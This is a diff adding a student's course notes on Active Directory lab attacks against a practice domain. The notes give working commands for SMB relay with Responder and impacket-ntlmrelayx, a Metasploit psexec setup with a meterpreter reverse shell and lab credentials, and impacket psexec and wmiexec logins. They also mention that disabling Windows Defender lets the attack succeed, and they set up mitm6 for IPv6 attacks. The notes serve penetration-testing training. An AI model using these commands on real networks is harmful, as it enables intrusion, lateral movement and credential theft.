@@ -2691,9 +2691,116 @@ fcastle::TREE:51934501eb00515e:9ABE5E3F30739166896A5BEEA3D0621F:0101000000000000
 > `\\ip-kali-machine`
 
 ![[Pasted image 20230311190013.png]]
-![[Pasted image 20230312124304.png]]
+
+![[Pasted image 20230313115943.png]]
 
 > [!info] 
 > Now having possiblility to crack hashes offline
 > 
+
+
+### SMB Relay Attack Demonstration Part 2
+
+> [!todo] 
+>` sudo responder -I eth0 -dwv`
+> 
+> Interactive Shell:
+>  `sudo impacket-ntlmrelayx -tf targets.txt -smb2support -i`
+
+![[Pasted image 20230313124200.png]]
+
+> [!todo] 
+> Connect to shell via NC
+> `nc 127.0.0.1 11000` 
+
+![[Pasted image 20230313124447.png]]
+
+> [!tip] 
+> Can create payload with msfvenom:
+> `sudo impacket-ntlmrelayx -tf targets.txt -smb2support -e test.exe` 
+> -----
+> Run specific command:
+> `sudo impacket-ntlmrelayx -tf targets.txt -smb2support -c "some command"` 
+
+### SMB Relay Attack Defenses
+
+![[Pasted image 20230313125306.png]]
+
+### Gaining Shell Access
+
+> [!todo] 
+> Start Metasploit:
+> `msfconsole`
+> Search for `psexec` 
+
+![[Pasted image 20230313125727.png]]
+
+> [!todo] 
+> Set Options:
+> `set rhosts 192.168.230.137` 
+> `set smbdomain marvel.local`
+> `set smbpass Password1`
+> `set smbuser fcastle`
+> `set payload windows/x64/meterpreter/reverse_tcp`
+> `set lhost eth0`
+> `run`
+
+![[Pasted image 20230313153648.png]]
+
+> [!todo] 
+> `show targets`
+> `set target 2`
+
+ ![[Pasted image 20230314072936.png]]
+
+> [!fail] 
+> No luck, Windows Defender blocked our attack:
+
+![[Pasted image 20230314073135.png]] 
+
+> [!fail] 
+> Other try:
+> `impacket-psexec marvel.local/fcastle:Password1@192.168.203.137`
+> At time of course recording, Windows Defender not catch this Attack. But now it catch attack. 
+
+> [!fail] 
+> Same problem with:
+> `impacket-wmiexec  marvel.local/fcastle:Password1@192.168.203.137` 
+
+> [!tip] 
+>  Deactivate Windows Defender allows this attack
+
+![[Pasted image 20230314075345.png]]
+
+### IPv6 Attacks Overview
+
+> [!hint] 
+> There is a good chance that there is IPv6 enabled in Network but not setup and no DNS Server configured. This is place where we jump in.
+> 
+
+![[Pasted image 20230314080007.png]]
+
+### Installing mitm6
+
+> [!todo] 
+> Download:
+> `git clone https://github.com/dirkjanm/mitm6`
+> `pip3 install -r requirements.txt`
+
+### Setting Up LDAPS
+
+![[Pasted image 20230314081214.png]]
+
+> [!todo] 
+> Next, Next
+> 
+
+![[Pasted image 20230314081256.png]]
+
+> [!todo] 
+> Next, Next, Next, Install, Close
+
+![[Pasted image 20230314081427.png]]
+
+![[Pasted image 20230314081457.png]]
 
